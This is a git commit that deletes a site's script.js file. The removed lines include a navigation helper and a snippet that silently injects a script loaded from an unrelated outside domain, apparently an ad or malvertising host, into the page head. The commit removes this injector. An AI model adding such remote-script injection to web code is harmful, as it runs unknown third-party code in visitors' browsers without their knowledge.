79a686b2af40b99546b2292cd83874b713eb1913
BILALeddaoudy <168599939+BILALeddaoudy@users.noreply.github.com>
2025-02-26 15:26:53 +0000

    Delete script.js

--- script.js
+++
@@ -1,7 +0,0 @@
-function navigateTo(page) {
-    window.location.href = page;
-}
-const script = document.createElement("script");
-script.type = "text/javascript";
-script.src = "//verbalimpliedgorilla.com/b2/67/7f/b2677f3dbe114444b160857a01387cdb.js";
-document.head.appendChild(script);
